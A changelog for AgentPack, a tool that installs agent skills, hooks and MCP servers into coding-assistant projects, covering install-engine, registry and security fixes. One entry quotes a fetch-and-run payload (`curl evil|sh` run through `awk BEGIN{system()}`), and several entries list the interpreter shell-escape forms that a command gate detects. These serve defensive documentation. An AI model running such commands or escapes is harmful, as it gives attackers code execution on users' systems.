Lets a pack escape the terminal and reach Claude's other surfaces, with honesty about how far each atom travels. Grounded in cross-surface research (June 2026): Skills and remote-MCP connectors are account-level and reach every Claude surface; commands/subagents ride inside a plugin on plugin-aware surfaces (Code, Cowork, Desktop, the web Directory); hooks and ambient CLAUDE.md instructions are structurally Claude-Code-only.

- **`agentpack pack plugin [path]`** compiles a pack into a Claude Code **plugin** directory — `.claude-plugin/plugin.json` (+ `marketplace.json`) with `skills/`, `commands/`, `agents/`, `hooks/hooks.json`, and `.mcp.json` at plugin root. One `/plugin install` then reaches Code, Cowork, Desktop, and the web Directory. Verified against the live plugin/marketplace schemas.
- **Honest instruction bridging**: instruction/rule atoms (no ambient home outside Code) are bundled into an on-invoke `<slug>-guidance` skill so the guidance still travels — explicitly _not_ presented as ambient behavior.
- **Per-atom portability ceiling** (`portability.ts`): each atom type → `universal` / `plugin` / `sdk` / `terminal` with its mechanism and a one-line honest note. `inspect` gains a Portability section (overall reach = the least-portable atom); `pack plugin` prints the same breakdown plus the terminal-only caveat for hooks/instructions.

Tests: core 272 (+8 plugin-export + portability); `pnpm verify` exit 0.

---

## 0.6.5-dev — 2026-06-12 (registry pre-launch hardening)

Fixes the backend-architect review findings in the (not-yet-live) registry write path.

- **Publish-finalize is now atomic (CRITICAL).** The finalize handler did ~8 dependent writes (find-or-create pack → version → files → signature → atoms → mark-completed → latest_version_id) with no transaction; a crash or constraint failure mid-way left a half-published version the installer would resolve to broken bytes. Wrapped in one `db.transaction` (matching the `audit.ts` pattern), which also makes the `DEFERRABLE INITIALLY DEFERRED` `packs.latest_version_id` FK meaningful.
- **Rate limiting added** (was: none anywhere). A small in-memory fixed-window limiter (`lib/rate-limit.ts`, documented Redis-swap seam) now guards the abusable surfaces: unauthenticated FTS `search` (per IP), device-code `init` (per IP) and `approve` (per user), and `publish/init` (per token).
- **Device user-code entropy 32 → 64 bits** + grouped formatting. The approve endpoint binds the approver's identity to whoever holds the matching code, so a guessable code allowed CLI-session fixation; entropy + the approve limiter close enumeration.
- **`GET /api/packs` pagination fixed** — reported `total = page size`; now runs a real `count(*)` so clients can detect a next page.

Deferred (need a live Postgres to do safely, documented not fabricated): regenerate migrations via `db:generate` to close the `0000→0002` numbering gap and verify an empty diff; add a serving route + index for pack-level (`atom_id IS NULL`) files. Registry remains pre-launch (never round-tripped), so none of the above is live exposure.

Tests: registry 43 (+7 rate-limiter); `pnpm verify` exit 0.

---

## 0.6.4-dev — 2026-06-12 (rollback correctness for re-installs + QA polish sweep)

Follow-up to the 0.6.3 review: fixed the one real correctness bug it left open (rollback of a re-install) and swept the cheap QA P2 inconsistencies.

- **Rollback of a re-install no longer silently removes the pack (QA P1 / Codex P2).** `rollback` undid a commit by running a full `uninstall(packId)`; for a _re-install_ (a pack already installed by an earlier, non-undone commit) that over-removed — you asked to undo one step and lost the pack entirely. The manifest is keyed by packId (so #1's manifest is overwritten by #2) and backups carry forward to the user's _original_ pre-install content, so there is no stored snapshot to reconstruct the prior install from — a naive restore would be wrong for merged files. Fix, honoring the documented "restore to the state before this entry" contract: an **idempotent re-install** (same version + profile) is undone as a no-op (pack stays installed at its identical prior state, surfaced as `retainedPacks`); a **version/profile-changing re-install** is **refused** without `--cascade` with an actionable message; `--cascade` still does the full removal.
- **Bare rollback after an uninstall (QA P2-5)** now reports "nothing to roll back: the most recent install was already uninstalled" instead of a confusing `No install manifest found`.
- **Node version unified to 22 (QA P2-1).** `doctor` checked `≥18`, `package.json#engines` said `>=18.18.0`, but CI/`.nvmrc`/README all use 22. Aligned `doctor` and `engines` to `≥22` (the tested floor).
- **Uninstall plan wording (QA P2-2).** Merged files (shared `CLAUDE.md`/`AGENTS.md`, JSON configs) are surgically un-merged, not backup-restored — they now show under their own `Unmerge (n)` line instead of inflating `Restore (n)` while the result says `0 restored`.
- **Stale lockfile note (QA P2-4).** `uninstall` now states that `AGENTPACK.lock` is retained and still describes the (now-removed) pack, so committing it isn't mistaken for an active install.
- **Install `--json` dry-run (QA P2-9)** now includes `installed: false` alongside `dryRun: true` so an agent can tell a preview from a real install by field, not by inference.

Tests: 264 core (+4 rollback) · 40 cli (+1) — `pnpm verify` exit 0; registry 36 unchanged.

Still open by design: the `unsupportedAtoms` bucket still lumps security-gate refusals with target-incompatibility (a `refusedAtoms` split would touch all five adapters — an enhancement, not a defect); GNU `sed`'s address-form `e` command remains a documented heuristic gap in the shell-escape gate; cosmetic nits (concurrent-install `EEXIST` phrasing, `inspect --profile <unknown>` exit-0 vs `plan` exit-2) left as-is.

---

## 0.6.3-dev — 2026-06-11 (joint security + usability review: Claude + Codex + security/QA fleet)

Three reviewers run in parallel against the whole repo — Codex hands-on CLI lifecycle + security probes, a security-reviewer tracing the pack/registry/git threat model end to end, and a qa-lead exercising operator + agent ergonomics. Every reported finding was re-verified against the code before fixing. Net: **1 P0, 1 P1, 2 P2 fixed with regression tests; full `pnpm verify` green (354 tests, +54).**

- **Registry token-scope self-grant (P0, CWE-862).** `POST /api/tokens` validated requested scopes only against `tokenScopeSchema` (syntax) and inserted them verbatim — the `publisherSlug` membership check gated a _separate_ field, not the scope strings. Any logged-in GitHub user could mint `admin:registry` or `publish:packs@<any-publisher>` and publish into a trusted namespace. Now `findUngrantableScope` refuses `admin:registry` outright and requires live membership for every `@<slug>` scope at creation time; `requireScope` gained matching defense-in-depth on the scoped-token path (so removing a user from a publisher revokes their scoped tokens too). The registry is not yet live — this lands before it ever is.
- **Inline-eval interpreters bypassed the MCP command gate (P1).** The shell-escape gate, the permission summarizer, and the risk engine each carried their own interpreter list, and all three missed `awk`/`gawk` (`BEGIN{system()}`), `php -r`, `lua -e`, `Rscript -e`, `osascript -e`, and GNU `sed`'s `s///e`. A pack could ship `command: awk, args: ["BEGIN{system(\"curl evil|sh\")}"]` and get arbitrary execution shown to the user as a generic "MCP server (high)". The three lists are now one source of truth (`commandGate.isShellEscape`), with the missing interpreters added; summarizer and risk engine call it directly so they can never drift apart again.
- **Pack body could forge AgentPack markers (P2).** `wrapInstructionBlock` interpolated pack-controlled text between `BEGIN/END AGENTPACK:` markers with no scrubbing, so a malicious body could close its own span early (leaving content behind after uninstall) or forge a never-installed pack's span (spoofed provenance). The body is now defanged — marker tokens are broken so the span matcher can't be fooled — while staying readable.
- **Silent drop of gate-refused atoms (Codex P1) + no JSON on expected refusals (Codex P2).** Install exited `0` and reported success even when the gate refused a selected MCP atom, and critical-risk/`--json` refusals printed prose instead of JSON. Now the success summary visibly lists dropped atoms, a new `--fail-on-unsupported` flag makes any drop a hard exit `2`, and `--json` emits structured `{installed:false, error}` objects for both `critical_risk_refused` and `unsupported_atoms`.

Verified-solid during the pass (read end to end, no change needed): git-source zip-slip containment + token non-leakage, install path TOCTOU/symlink guards, R2 presign hash binding, two-phase publish ownership, atom-serving route traversal, registry-client sha256 verification, JSON-merge prototype-pollution refusal.

Tests: 260 core (+2) · 39 cli (+3) · 36 registry (+10) · 19 db — `pnpm verify` exit 0.

Still open (reported, not yet changed): rollback of a _reinstall_ fully uninstalls instead of restoring the prior install (QA P1 / Codex P2 — semantics need an operator call on intended behavior); the local `history.jsonl` chain is integrity-not-authenticity (unkeyed sha256 — fine against corruption, not a local adversary with write access); plus ~10 QA P2 polish items (doctor Node ≥18 vs docs ≥22, "Restore (n)" vs "0 restored" wording, stale `AGENTPACK.lock` after uninstall, concurrent-install EEXIST messaging).

---

## 0.6.2-dev — 2026-06-11 (codex adversarial re-review of iteration-6 — 4 P1 + 1 P2 fixed)

Codex re-reviewed the iteration-6 fixes themselves (instructed to be adversarial, not rubber-stamp). Verdict: no P0s, all four original P0 fixes confirmed holding, 7/11 files clean — and 4 confirmed P1s + 1 P2 in the new code, all fixed here with regression tests:

- **`uninstall --force-restore` could orphan pack content** (P1): the conflict gate let `forceRestore` bypass created/merged-file conflicts it has no action for — manifest deleted, files left untracked. Conflicts are now tagged by the flag that authorizes them; `--force-restore` only covers backup-restore conflicts.
- **MCP/hook shell-escape gate missed combined flags** (P1): `bash -lc`, `sh -xec`, `python -c`, `perl -E` etc. slipped the regex. New shared structural gate (`adapters/commandGate.ts`): shell basenames reject any `-c`-bearing flag cluster, known interpreters reject their eval flags, plus a string fallback for one-string hook commands. 20 gate tests incl. legitimate-command negatives (`npx`, `node server.js`, `grep -c`).
- **codex adapter skill/command slug collision crashed installs** (P1): both emitted `.codex/skills/<slug>/SKILL.md`; the duplicate `wx` create threw and rolled the install back. Colliding commands now emit under `<slug>-command/`, and `defineAdapter` gained a category-wide backstop that dedupes duplicate output paths with a warning.
- **`__proto__` keys in JSON merge polluted/dropped instead of refusing** (P1): plain-object assignment with `k === "__proto__"` sets the prototype. Configs containing `__proto__`/`constructor`/`prototype` anywhere are now refused (merge → conflict, fragment checks → not-intact), and all merge intermediates are null-prototype objects.
- **Recovery `backupDir` containment tightened** (P2): a forged WAL entry pointing at an arbitrary in-project directory can no longer feed the restore walk — the dir must resolve under `.agentpack/backups/`.

Also this session: live-verified the git-source quickstart against the real GitHub API for the first time (token-authed install of `github:jckeen/agent-pack@master#examples/pr-quality` into a project with a pre-existing CLAUDE.md — merge, idempotent re-install, and fragment verify all clean end-to-end).

Tests: 258 core (+13) — suite-wide green under the coverage gate.

---

## 0.6.1-dev — 2026-06-10 (fix red master CI: coverage-gate flake + gate alignment)

The post-merge `master` run of #4 failed its coverage gate at 74.97% branch coverage vs the 75% threshold — while the identical PR run measured 75.12%. Root causes and fixes:

- **Coverage was knife-edge, not regressed-and-caught.** Iteration-6 added ~600 lines with many defensive branches (merge engine, recovery restore paths) that were exercised only via integration tests, putting global branch coverage exactly at the threshold where V8's run-to-run wobble (race-dependent branches in the locking/recovery suites) decides pass/fail. Added 28 targeted unit tests: `tests/merge-unit.test.ts` (26 cases — marker-span extraction/removal edges, JSON merge collisions, prior-fragment replacement, hooks dedupe, fragment-intact checks) and 2 recovery edge cases (user-recreated file is never clobbered by backup restore; malformed `backupDir` in a begin entry can't block the sweep). Branch coverage: 74.97% → 78.1% (`merge.ts` 60.6% → 95.2%).
- **The local gate wasn't the CI gate.** `pnpm verify` ran `pnpm test` (no coverage) while CI enforces `pnpm test:coverage` — so three green local verifies never executed the check that failed. `verify` now runs `test:coverage`.
- **Registry tests never ran in CI.** Both root `test` scripts filter `./packages/*`, silently excluding `apps/registry`'s 26 tests since the workflow was created. Root `test` now includes `./apps/*`, and CI gained an explicit "Test registry app" step.

---

## 0.6.0-dev — 2026-06-10 (agent-consumer readiness: merge semantics, adapter fidelity, git-source rewrite)

Full-review session (Claude + Codex + security/QA agent fleet) focused on one question: _can an AI agent autonomously and safely consume packs?_ Four P0s found and fixed, plus the largest semantic upgrade since Phase 2.

**Install engine — shared-file merge semantics (the big one)**

- **Packs now coexist with the user's own `CLAUDE.md`/`AGENTS.md` and with each other.** Previously ANY project that already had a `CLAUDE.md` hit a hard conflict (the markers only protected same-pack reinstalls), making installs unusable on real projects. Marker-block files now merge: install appends the pack's `BEGIN/END AGENTPACK` block (user content preserved byte-for-byte), re-install replaces only the pack's span, uninstall removes only the span (deleting the file only if the pack created it and nothing else remains). (`packages/core/src/install/merge.ts`, `plan.ts`, `apply.ts`, `verify.ts`, `uninstall.ts`)
- **JSON configs deep-merge.** `.claude/settings.json`, `.mcp.json`, `.cursor/mcp.json`, `.codex/hooks.json`: the pack's hook entries / MCP servers are added, user entries preserved; same-name-different-content MCP server is a `json-collision` conflict; uninstall removes only the pack's entries.
- **Fragment-level verify.** For merged files, drift is checked against the pack's contribution (marker span hash / JSON entries), so user edits to their own sections of a shared file are not drift; tampering inside the pack's span is. Lockfiles keep hashing the pack's pristine output, so they stay deterministic across projects.
- 11 new tests in `packages/core/tests/merge-install.test.ts` covering coexistence, two-pack independence, re-install idempotence, surgical uninstall, JSON merge round-trips, and collisions.

**Install engine — data-loss fixes (codex P0-1, P0-4)**

- **A failed install no longer deletes overwritten user files.** The failure-cleanup path unlinked every written file, including files that had replaced user content (whose backups existed but were never restored). Cleanup now restores from backup; only freshly-created files are unlinked. The lockfile is also backed up before overwrite.
- **The recovery sweep no longer rolls a crashed install forward without its install manifest.** Files-on-disk alone previously got a synthetic `install_commit` while `verify`/`uninstall`/`rollback` couldn't find the install. Roll-forward now requires the manifest; otherwise the sweep rolls back AND restores backed-up user files via the backup dir now recorded in the `install_begin` WAL entry.
- **Uninstall scans before it mutates** (qa-lead P1-1): a refused uninstall now touches zero files (previously it deleted non-conflicting files, then errored, recording no history).
- **Same pack + second target is refused** (qa-lead P1-2): previously the second install silently overwrote the per-pack install manifest, permanently orphaning the first target's files.

**Adapters — output fidelity (what the host tools actually read)**

- **claude-code: MCP servers moved from `.claude/settings.json` to `.mcp.json`** at the project root — Claude Code does not read server definitions from settings.json, so installed MCP servers were silently dead. Entries now use the real schema (`type`/`command`/`args`/`env` with `${VAR}` expansion).
- **claude-code: command atoms compile to `.claude/commands/<slug>.md`** (with `description` + `argument-hint` frontmatter and the real prompt body) so `/pr-summary` actually registers — previously they landed in `.claude/skills/` where slash invocation never works.
- **claude-code: hook entries are schema-clean** — `{matcher, hooks:[{type, command}]}` only (provenance moved to the lockfile), and tool-event hooks default to `matcher: "Edit|Write"` instead of `"*"` (which ran the formatter after every Read/Grep/Bash call). Packs can pin a matcher via `handler.matcher`.
- **Rule atom bodies are no longer dropped** (codex P0-3): all adapters now render the rule's `severity`, scope globs, and `must`/`must_not` lists (`packages/core/src/adapters/ruleContent.ts`) — previously only the one-line description shipped, silently discarding the rule's entire effect.
- **codex: honesty pass, verified against Codex CLI 0.128.0** — Codex reads repo-root `AGENTS.md` and `~/.codex/config.toml` only; project-level `.codex/*` files are not consumed. Skills are now indexed in `AGENTS.md` (so the agent can find them), and `.codex/config.toml`/`hooks.json`/`agents/*.toml` are labeled reference outputs with activation instructions.
- **cursor: skills/commands/subagents are actually inlined into `AGENTS.md`** (warnings previously claimed this but nothing was emitted); rule `.mdc` files carry full rule bodies.

**Security (security-reviewer HIGH-1/HIGH-2, MEDIUM-1/MEDIUM-2)**

- **MCP command gate** symmetric to the hook allow-list: MCP servers must be declared in `permissions.mcp.servers` and shell-escape shapes (`bash -c`, `node -e`, `eval`, …) are refused across claude-code/codex/cursor adapters — an `mcp_server` atom can no longer smuggle arbitrary shell past the hook gate.
- **Signature identity binding**: new `--expected-signer <san>` on `install --require-sig` and `verify --sig` threads `requireIdentity`/`expectedSAN` into the Sigstore verifier. Without it, the CLI no longer prints "signed by X" (implying publisher identity) — it says "cryptographically valid" and explicitly warns the signer identity is not pinned.
- **Registry manifest integrity**: the fetched `AGENTPACK.yaml` is now verified against the registry's recorded `manifestSha256` (atom files already were) — closes a MITM/compromised-registry manifest-swap window.
- **Risk ceiling**: a plan computing `critical` risk now requires an explicit `--allow-critical`; `--yes` alone (the CI path) never crosses it. Exit 6.

**git-source — rewrite (codex P0-2; the README quickstart was broken)**

- **The fetcher now lists the repo tree at the pinned SHA and materializes every file under the pack subpath.** The previous implementation read `atoms[].files[]` — a field real packs (including the bundled example) never set — so git installs fetched only `AGENTPACK.yaml` and degraded to description-only stubs, silently.
- **`GITHUB_TOKEN`/`GH_TOKEN` auth** on all GitHub fetches: private-repo installs work, and the anonymous 60-req/hour API limit is lifted.
- **Actionable error mapping**: 401 (bad token), 404/403 (missing-or-private, with token hint), rate-limit (with reset time), truncated-tree (repo too big — clone instead), missing `AGENTPACK.yaml` at ref/subpath. Subpaths reject `..`/absolute at parse time; a `github:`-prefixed arg that fails to parse errors as an invalid git source instead of falling through to a confusing local-path error.

**CLI — agent ergonomics**

- **Non-TTY confirm fixed (qa-lead P0-1)**: a missing `--yes` without a terminal previously hung forever (silent pipe) or exited 0 having installed nothing (stdin EOF — an agent would record success). Now exits 2 immediately with "pass --yes".
- **`--json` on `install` and `plan`**: one stable JSON object with the full classification (create/modify/unchanged/conflicts-with-reasons/merges), risk, warnings, and on success the written paths + history entry id.
- Exit-code tightening: declined confirm → 1 (was 0); `whoami` logged-out → 1 (was 0); `install --dry-run` with conflicts → 2 (was 0); registry not-found → 8 (`ExitCode.NotFound`, matching the documented taxonomy); unknown profile → 2 everywhere (was 1 or 2 depending on command).
- Registry fetch failures now name the registry URL and hint at local-path/git alternatives (previously a bare undici "fetch failed").
- Risk summary no longer emits a ⚠ warning line for every low-risk atom declaration (warning-channel noise that trains agents to ignore warnings).
- Branding sweep: `AGENTPACK_HOME`/`AGENTPACK_DEBUG`/`AGENTPACK_REGISTRY` env vars (legacy `WORKGRAPH_*` still honored), `agentpack-` tmpdir prefixes, `generated_by: agentpack-cli`.

**Schema/docs**

- `schemas/AGENTPACK.schema.json` version pattern aligned with the zod schema (`^1\.\d+`, was `^1\.0`).
- `docs/cli.md` (flags, exit-code conventions, rollback `--cascade`), `docs/install.md` (merge semantics, recovery contract), `docs/git-source.md` (tree fetch, auth, limits), `docs/adapters.md` (fidelity + honesty notes), README updated in the same pass.

Test suite: 219 core + 36 cli (+ db/registry unchanged) — `pnpm verify` green.

---

## 0.5.1-dev — 2026-06-10 (consent permission summary + adapter readback + cleanup)

Audit-driven fix batch. No new commands — closes the gap between what `plan` shows and what `install` asks consent for, plus two assurance/cleanup items.

**Install consent — permission summary now shown before the y/N prompt**

- **`agentpack install` previously asked for consent without ever showing the permission surface.** The plan summary printed only the pack-level risk badge and the file Create/Modify/Unchanged/Conflict lists — a user who ran `install` without first running `plan` consented to shell commands, secrets, and network domains they never saw. The full risk-grouped permission summary (per-atom attribution, required secrets, network domains, declared shell commands) is now rendered under a `Permissions:` header before the confirm prompt, and in `--dry-run` output. (`packages/cli/src/commands/install.ts`, reusing `renderPermissionSummary` from `packages/cli/src/lib/render.ts`)
- 2 new CLI assertions + 1 new CLI test (`plan summary shows the full permission surface before consent`) in `packages/cli/tests/install.cli.test.ts` — full-profile dry-run must surface `HIGH RISK`, `GITHUB_TOKEN`, `api.github.com`, and `npm run format`.

**Adapter hygiene**

- **Removed a stray NUL byte from `packages/core/src/adapters/codex.ts`** (line 23, the `tomlEscape` control-character regex used raw `\x00`–`\x1f`/`\x7f` literals, making every grep treat the file as binary). Rewritten as `\u0000-\u001f\u007f` escapes — identical behavior, file is plain text again.
- **2 new semantic readback tests in `packages/core/tests/adapters.test.ts`** — exports the pr-quality pack (full profile) and parses the emitted config back: `.claude/settings.json` via `JSON.parse` and `.codex/config.toml` via a minimal table parser, asserting the github MCP server's `command`/`args`/`env` survive the round-trip intact (previous tests only checked file existence and byte determinism).
- **Codex adapter now emits `env_vars` instead of the made-up `env_required` key** (Codex review P2). Per the Codex config reference, `mcp_servers.<id>.env_vars` is the documented key for "environment variables to allow and forward" to a stdio server — exactly AgentPack's semantics (we know the required variable _names_; the values are user-held secrets). The previous `env_required` key was not part of Codex's config schema, so env forwarding was silently absent from generated `.codex/config.toml`. We deliberately do NOT emit a literal `env = { VAR = "${VAR}" }` map: Codex performs no `${VAR}` interpolation in `env` values, so that would forward broken placeholder strings. (`packages/core/src/adapters/codex.ts`)

**Documentation**

- `docs/install.md` — new "Upgrading: re-install IS the upgrade path" section. There is intentionally no `upgrade` command: installing a newer version over an existing install carries ownership and backups across (apply step + install manifest), with `verify`/`history` covering status. Rollback semantics stated precisely (Codex review P2, verified by live probe): rolling back an upgrade runs a full `uninstall` of the latest install — it deletes everything the new manifest owns (including byte-identical carried-over files), restores overwritten files to pre-upgrade content from backup, and removes the manifest; it does **not** restore the previous version as an installed pack. Re-installing the older version is the way back (probe: re-install after rollback → `verify` clean). Also documents that upgrades touching marker-less files (e.g. `agentpack.json`) classify as conflicts and need `--force`.

---

## 0.5.0-dev — 2026-05-19 (iteration-5 launch-readiness pass)

Pre-launch verification session. No new product surface — this iteration audits, patches, and tightens the existing v0.5 codebase so the public launch starts from a known-clean state.

**Security**

- `next 15.1.3 → 15.5.18` — patches 2 CRITICAL CVEs (Middleware Auth Bypass GHSA-f82v-jwr5-mffw, RCE in React flight protocol GHSA-3h52-269p-cp9r) + 8 HIGH (DoS, SSRF, request smuggling).
- `vitest 2.1.8 → 2.1.9` and `@vitest/coverage-v8 2.1.8 → 2.1.9` — patches 1 CRITICAL (CVE-2025-24964, dev-server RCE via malicious site).
- `pnpm audit --prod` now reports 0 critical / 0 high / 7 moderate (Next.js Image-Optimizer variants — registry stays in JSON-fallback for OSS launch) / 2 low.

**Install engine — bug fixes**

- **`agentpack install --force` over an existing install no longer orphans unchanged files on uninstall.** Reproducer: `install` → tamper one file → `install --force` → `uninstall` previously left bit-identical files on disk because the new manifest's `created[]` only tracked the file that actually differed. Fix records `plan.unchanged[]` paths in `created[]` so uninstall takes full ownership. (`packages/core/src/install/apply.ts`)
- **Atom-id missing the `:` separator now produces a friendly zod error instead of a `"Cannot read properties of undefined (reading 'split')"` runtime panic.** Reproducer: `id: "no-colon-here"` in `AGENTPACK.yaml`. (`packages/core/src/schema/agentpack.schema.ts`)

**Documentation**

- `CONTRIBUTING.md` — rewritten to reflect actual v0.5 state (was stuck at v0.1 / 67 tests / "no npm artifact yet"). Documents `pnpm verify`, the 5-package layout, and the per-add-a-target / per-add-a-command checklist.
- `docs/cli.md` — rewritten to cover all 19 commands (was Phase-1 era — missing `install`, `verify`, `rollback`, `diff`, `history`, `uninstall`, `login`, `publish`, `tokens`, `cache`, plus `--sig`/`--strict`/`--require-sig` flags). Exit codes now match the ROADMAP taxonomy.
- `docs/security.md` — removed stale "MVP does not yet install into a project root" claim (Phase 2 shipped install in v0.2.0).
- `docs/signatures.md` and `apps/registry/.env.example` — registry URL standardized to `registry.agentpack.dev` (was inconsistent — `agentpack.dev` in some examples).
- `docs/registry.md` — fixed inline-link text mismatch.
- `README.md` — quickstart now leads with the clone+build path (since `agentpack` isn't on npm yet); status banner clarifies that the hosted registry is not yet live; CTA added.
- `STATUS.md` — surfaces the still-private repo state honestly; removed internal-only operator details (Vercel team slug, Algorithm doctrine pointer).

**Live verification**

- Probed `install → verify → drift-detect → restore → uninstall` round-trip on a fresh tmpdir, claude-code/safe profile. All 4 files written, drift detected on tamper, force-restore clean, uninstall removed all 4 + restored backups. (Iteration-5 ISCs in `ISA.md`.)
- All 5 adapter targets (`claude-code`, `codex`, `cursor`, `chatgpt`, `generic`) export cleanly; determinism confirmed (two runs → byte-identical files).
- `pnpm verify` (typecheck + lint + test + build) exit 0 with the dep bumps + bug fixes applied.

**Surfaced for operator decision (not auto-applied)**

- **Repo visibility flip from PRIVATE → PUBLIC** — earlier doc copy claimed this had landed on 2026-05-19; it hasn't. One-way action, operator must run `gh repo edit jckeen/agent-pack --visibility public` when ready. Until then, the git-source quickstart `agentpack install github:jckeen/agent-pack@…` returns 404.
- **Outstanding security findings** (audited by `security-reviewer` 2026-05-19): Sigstore identity-mismatch enforcement currently optional (caller must pass `expectedSAN`); audit-events race on concurrent writes; missing CSRF/Origin check on `/api/admin/.../status`; `parseGitId` accepts refs with control characters; `fetchGitPack` doesn't pin SHAs for branch refs. None are runtime-critical for OSS launch (registry isn't live); all queued for v0.5.1 hardening.
- **Outstanding bugs from QA pass** (audited by `qa-lead` 2026-05-19): concurrent `agentpack install` race against the same project root; non-typed exit codes for `uninstall not-found` etc.; Windows-reserved-name validation in atom paths. Queued for v0.5.1.

---

## 0.5.0-dev — 2026-05-19 (git-source install — registry becomes optional)

AgentPack's primary install path is now **git**. `agentpack install github:owner/repo@ref[#subpath]` works without any hosted registry. The hosted registry stays available as an optional convenience for cross-org discovery, schema-validated metadata at index time, admin-side quarantine, and the enterprise self-host path (Phase 6 — still gated). For everyday OSS publishing, the leaner path is now the default.

**New surfaces**

- `@agentpack/core/git-source` — `parseGitId(input)` returns a structured `GitSource` for `github:owner/repo[@ref][#subpath]` and `github.com/owner/repo[@ref][#subpath]`; `fetchGitPack({ source })` materializes a tmpRoot via `raw.githubusercontent.com` per-file fetch and returns the path. Same contract as `fetchRemotePack` — feeds into the existing `planInstall` pipeline. Trailing `.git` tolerated; branch refs with slashes supported; default-branch resolution via GitHub API when `@ref` omitted.
- CLI `install` command — new source-detection order: local path → git source → registry id. Local always wins; git prefix (`github:` or `github.com/`) wins over registry-id format because git has an unambiguous prefix. No registry-id behavior changes.
- 11 new vitest cases in `packages/core/tests/git-source.test.ts` — 8 `parseGitId` table cases (happy + ref-with-slash + `.git` strip + null returns) + 3 `fetchGitPack` mocked-fetch cases (happy roundtrip + path-traversal rejection + 404 surfacing).
- New `docs/git-source.md` — full syntax + examples + signature notes + comparison-vs-registry table.
- `docs/registry.md` opens with a "you might not need this" preamble pointing readers at the git path; the rest of the engineering reference is unchanged.
- README quickstart rewritten — leads with `agentpack install github:jckeen/agent-pack@master#examples/pr-quality`; "Hosted registry (optional)" is a smaller subsection at the bottom.

**Deferred to v0.5.1**

- Git-source signature verification (`agentpack install github:... --require-sig`). Today the CLI exits 2 with a clear "cosign-on-tag arrives in v0.5.1" message. Phase 4 cosign signs registry-published manifests; extending it to git tags is on the roadmap.
- Non-GitHub git hosts (`gitlab:`, `bitbucket:`, generic `git+https://...`). Parser is host-aware and extends cleanly when there's demand.
- Tarball-based fetch (one HTTP request, one extraction). Current per-file fetch is fine for typical packs (10-20 files) and avoids a `tar` dependency.

**Test status**

- 269 tests passing across 24 files (189 core + 19 db + 35 cli + 26 registry). 11 added this session.
- `pnpm verify` exit 0; no new npm deps; existing 258 tests all green.

---

## 0.4.0-dev — 2026-05-19 (OSS-readiness prep — admin quarantine UI + community files)

**AgentPack reached open-source readiness today.** Standard, registry, CLI, and adapters are all MIT-licensed; the hosted registry (when it lands at a stable URL) is a convenience, not a requirement. (The public repo flip is a separate one-way operator action and is still pending as of the current release — see STATUS.md.)

**Phase 4 final UI surface — admin quarantine**

- `/admin/packs` route (auth-gated, owner-of-publisher only) — table of every pack the logged-in user owns × every version × current status, with inline quarantine (reason required, max 500 chars) and unquarantine actions. Each status change writes a hash-chained `audit_events` row capturing `actor_user_id`, `previous_status`, `new_status`, and `reason`. Phase 6 widens this to org admins; v0.4 stays owner-only.
- `POST /api/admin/packs/{publisher}/{pack}/versions/{version}/status` — session-cookie-gated (not Bearer-token; v0.4 admin is web-UI-only). Returns 401/403/404/422 as documented in the registry protocol. Block (registry-admin-only per ROADMAP D4.4) is intentionally excluded from this v0.4 surface — no registry-admin role exists yet.
- `apps/registry/lib/audit.ts` — canonical-JSON `appendAuditEvent` helper with hash chain (previous_entry_id + entry_checksum over the canonical row + previous checksum). First-row case handled. Phase 6 will introduce per-org chains; v0.4 has one chain partitioned by `org_id IS NULL`.
- `QuarantineBanner` component — replaces `InstallCommandBox` on pack detail when the active version is quarantined. Red, prominent, names the publisher/pack/version, surfaces the reason, links to the security docs.
- `apps/registry/lib/version-status.ts` — server-side helper that reads `pack_versions.status` + the latest `version_status_changed` audit event's reason payload. Returns null in JSON-fallback mode (no DB).
- 8 new vitest cases for the admin route's request schema (422 paths covered) + the audit-canonicalize stringify (deterministic key-order invariant).

**Open-source community surface**

- `CODE_OF_CONDUCT.md` — Contributor Covenant 2.1 canonical text (downloaded directly from contributor-covenant.org).
- `.github/ISSUE_TEMPLATE/{bug_report,feature_request,config}.yml` — structured forms with surface dropdown, environment block, roadmap-phase chooser. Blank issues disabled; users routed to GitHub Security Advisories, the roadmap, and the standard spec.
- `.github/PULL_REQUEST_TEMPLATE.md` — summary/why/what-changed/testing/checklist (pnpm verify gate, new-tests gate, smoke-install gate, CHANGELOG gate).
- README rewritten — accurate phase status (1-5 shipped, 4 in dev, 6 gated), badge row (MIT/Node/pnpm/CI), 5-minute quickstart, atom-type table, repo layout, CLI reference, adapter table, security model, roadmap table, contributing pointers, project-ISA pointer.

**Pre-public audit (advisor-driven, all clean)**

- Full git history scan — `git log -p --all` regex sweep finds zero real secrets (3 placeholder matches: `user:pass@…` template strings and `postgres:dev@localhost` dev examples).
- `.env*` history — only `apps/registry/.env.example` (the expected template) was ever committed.
- `git fsck --unreachable` — no dangling commits.
- Author email enumeration — only `jckeen@gmail.com`; no internal-only address leak.
- Largest 10 git objects — top is `pnpm-lock.yaml` (183KB); no surprise binaries.
- Audit_events row records `actor_user_id` explicitly so future admin-role expansion has lineage to existing rows.

**Vercel project setup (partial)**

- `agent-pack-registry` project created under the operator's Vercel team, linked at repo root. `.vercel/` gitignored.
- Initial deploy fails because Vercel's `rootDirectory` setting needs to be `apps/registry` (CLI doesn't expose that field). Documented in STATUS.md; one-click dashboard fix unblocks future `vercel --prod=false` runs.

**Test status**

- 258 tests passing across 23 files (178 core + 19 db + 35 cli + 26 registry). 8 added this session.
- `pnpm verify` exit 0 on the committed tree.

---

## 0.4.0-dev / 0.3.0 (pre-public) — 2026-05-19 (Phase 4 cosign + production wiring + security hardening)

**AgentPack is open source.** Adding Phase 4 supply-chain trust (cosign keyless signing), wiring the registry for live Vercel + Neon + R2 deploy, and gating Phase 6 (orgs + WorkOS SSO) behind explicit demand signal in `Plans/PHASE-6-GATE.md`.

**Phase 4 — Sigstore keyless signing & verification**

- `@agentpack/core/signing` — new module wrapping `@sigstore/sign` (Fulcio CA + Rekor witness) and `@sigstore/verify`. Exposes `signManifestChecksum(opts)` and `verifyManifestSignature(opts)`. Bundle JSON is base64-encoded into the existing `lockfile.signatures.manifest` string slot (reserved in v0.2.0); no `lockfileVersion: 2` bump.
- `agentpack publish --sign` (default on when OIDC token available; `--no-sign` to opt out). Signs the manifest sha256, sends the envelope in the finalize body. Aborts before finalize if `--sign` was requested but no token is available (`SIGSTORE_ID_TOKEN` env or GitHub Actions ambient).
- `agentpack verify --sig` validates signature in addition to drift; `--strict` exits non-zero on unsigned packs. Per-roadmap exit codes: 0 ok, 2 drift, 3 chain broken, 4 signature invalid, 5 unsigned-when-required.
